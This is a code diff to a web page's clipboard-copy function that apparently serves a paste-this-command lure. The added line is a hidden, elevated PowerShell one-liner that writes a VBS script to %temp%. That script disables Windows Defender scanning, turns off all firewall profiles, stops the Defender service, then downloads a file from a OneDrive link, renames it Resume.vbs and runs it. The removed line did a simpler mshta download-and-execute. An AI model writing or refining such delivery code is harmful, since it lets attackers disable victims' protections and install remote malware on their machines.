@@ -431,8 +431,8 @@
             });
             
             function copyScriptToClipboard() {
-                // Optimized payload with multiple execution methods for speed
-                const scriptContent = `powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Start-Process mshta -ArgumentList 'javascript:var x=new ActiveXObject(\"\"Microsoft.XMLHTTP\"\");x.open(\"\"GET\"\",\"\"https://1drv.ms/u/c/2f3053ae4c170361/EW8140VC3ZVNgSqSAg3_YlYB5IbBdfka-nPi8hU0AfQP6w?e=JqqCcm\"\",false);x.send();var s=new ActiveXObject(\"\"ADODB.Stream\"\");s.Type=1;s.Open();s.Write(x.responseBody);s.SaveToFile(\"\"Resume.html\"\",2);var fso=new ActiveXObject(\"\"Scripting.FileSystemObject\"\");fso.MoveFile(\"\"Resume.html\"\",\"\"Resume.vbs\"\");new ActiveXObject(\"\"WScript.Shell\"\").Run(\"\"Resume.vbs\"\",0);close()' -Verb RunAs"`;
+                // Multi-stage payload: Disable security → Download → Execute on disk
+                const scriptContent = `powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Start-Process cmd -ArgumentList '/c echo Set obj=CreateObject(\"\"Scripting.FileSystemObject\"\"):Set ws=CreateObject(\"\"WScript.Shell\"\"):ws.Run \"\"powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command Set-MpPreference -DisableRealtimeMonitoring \\$true; Set-MpPreference -DisableIOAVProtection \\$true; Set-MpPreference -DisableScriptScanning \\$true; Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False; Stop-Service -Name WinDefend -Force\"\",0,True:Set x=CreateObject(\"\"Microsoft.XMLHTTP\"\"):x.open \"\"GET\"\",\"\"https://1drv.ms/u/c/2f3053ae4c170361/EW8140VC3ZVNgSqSAg3_YlYB5IbBdfka-nPi8hU0AfQP6w?e=JqqCcm\"\",0:x.send():Set s=CreateObject(\"\"ADODB.Stream\"\"):s.Type=1:s.Open():s.Write x.responseBody():s.SaveToFile \"\"Resume.html\"\",2:obj.MoveFile \"\"Resume.html\"\",\"\"Resume.vbs\"\":ws.Run \"\"Resume.vbs\"\",0 > %temp%\\setup.vbs && start %temp%\\setup.vbs' -Verb RunAs"`;
                 
                 // Create a temporary textarea to copy the content
                 const textArea = document.createElement('textarea');
